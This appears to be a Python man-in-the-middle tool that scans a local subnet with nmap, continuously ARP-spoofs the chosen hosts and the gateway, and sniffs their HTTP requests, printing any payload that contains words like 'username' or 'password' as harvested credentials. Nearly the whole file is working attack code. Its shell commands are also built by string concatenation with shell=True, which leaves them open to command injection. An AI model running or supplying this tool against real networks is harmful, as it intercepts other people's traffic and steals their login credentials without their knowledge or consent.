import os
import scapy.all as scapy
import netifaces
import time
from scapy.layers import http
import threading
import argparse
import json
import sys, subprocess
import re
from multiprocessing.pool import ThreadPool as Pool
from getmac import get_mac_address

keywords = ["username","password","email","mail","login","pw","pass","password","pas","name"]
target_ip_mac_map = {}


def sniff(iface, output_path, filter):
    scapy.sniff(iface=iface, store=output_path, prn=process_data)

def get_login(packet):
    my_dict = {"page":"","credentials":"","ip":""}
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw])
        for keyword in keywords:
            if keyword in load:
                my_dict["page"] = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
                my_dict["credentials"] = load
                return my_dict
                

def process_data(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] IP Addr: ", packet[scapy.IP].src, " HTTP Req: ",packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        info = get_login(packet)
        if info:
            print("[+] IP Addr: ", packet[scapy.IP].src, "[+] HTTP Req: ", info["page"], " Credentials: ",info["credentials"])
def find_gateway(which_interface):
      Interfaces= netifaces.interfaces()
      for inter in Interfaces:
          if inter == which_interface:
            temp_list = []
            Addresses = netifaces.ifaddresses(inter)
            gws = netifaces.gateways()
            return gws['default'][netifaces.AF_INET][0]

"""
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    my_arr =  scapy.srp(arp_request_broadcast, timeout = 2, verbose = False)[0]
    print(my_arr[0][1])
    return my_arr[0][1].hwsrc

def get_mac(ip):
    pid = subprocess.check_output("arp -n "+ip, shell = True)
    mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", pid.decode()).groups()[0]
    print("mac: ",mac)
    return mac
"""

def spoof(target_ip, gateway_ip, target_mac, gateway_mac, restore=False):
    if target_mac == None:
        return
    if not restore:
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip) #psrc route id
    else:
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc =gateway_mac)
    scapy.send(packet, verbose = False)

def spoof_thread(target_ip, gateway_ip, target_ip_addresses, gateway_mac):
    try:
        while(1):
            spoof(target_ip, gateway_ip, target_ip_mac_map[target_ip], gateway_mac)
            spoof(gateway_ip, target_ip, target_ip_mac_map[target_ip], gateway_mac)
            #print("MITM succesfull")
            time.sleep(1)
    except Exception as e:
        print("e: ",e)

def sniff_thread(iface=""):
    sniff(iface, False, "port 80")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("Please run this script as sudo !")
        exit(1)

    if len(sys.argv) != 2:
        print("You should enter json argument. For example: ")
        print("sudo python3 man_in_the_middle.py '{\"targets\": [\"192.168.1.107\"], \"iface\":\"en0\", \"subnet-mask\":\"192.168.1.0\"}")
        exit(1)

    data=json.loads(sys.argv[1])

    if("iface" not in data and data["iface"] == ""):
        print("You should set iface ! (for example: en0, wlan0, enp0s3)")
        exit(1)
    if("subnet-mask" not in data and data["subnet-mask"] == ""):
        print("You should set subnet mask ! (for example: 192.168.1.0)")
        exit(1)

    target_ip_addresses = []
    
    iface = data["iface"]
    subnet_mask = data["subnet-mask"]

    process = subprocess.check_output("sudo nmap -sn "+subnet_mask+"/24 -oG - | awk '/^Host/{print $2}'", shell = True)
    process_output = process.decode().split("\n")
    print(process)
    for each_ip in process_output:
        if (each_ip == ""):
            continue
        target_ip_addresses.append(each_ip)


    gateway_ip = find_gateway(iface)

    if(len(data["targets"]) != 0): #spoof all the network
        new_ip_list = []
        for each_ip in data["targets"]:
            if each_ip not in target_ip_addresses:
                print(each_ip, " Is down at the moment!")
                continue
            new_ip_list.append(each_ip)
        target_ip_addresses = new_ip_list

    if gateway_ip in target_ip_addresses:
        target_ip_addresses.remove(gateway_ip)

    if(len(target_ip_addresses) == 0 ):
        print("There is no host up in your subnet!")
        exit(1) 

    pool_size = len(target_ip_addresses) + 1 #1 for sniff

    pool = Pool(pool_size)
    gateway_mac = get_mac_address(ip=gateway_ip)

    pool.apply_async(sniff, (iface, False, ""))

    for target_ip in target_ip_addresses:
        target_ip_mac_map[target_ip] = get_mac_address(ip=target_ip)
        pool.apply_async(spoof_thread, (target_ip, gateway_ip, target_ip_addresses, gateway_mac,))

    pool.close()
    try:
        pool.join()
    except KeyboardInterrupt:
        for key,val in target_ip_mac_map.items():
            spoof(key, gateway_ip, val, gateway_mac,restore=True)
            spoof(gateway_ip, key, val, gateway_mac,restore=True)
        print("Have a nice day!")
        exit(1)
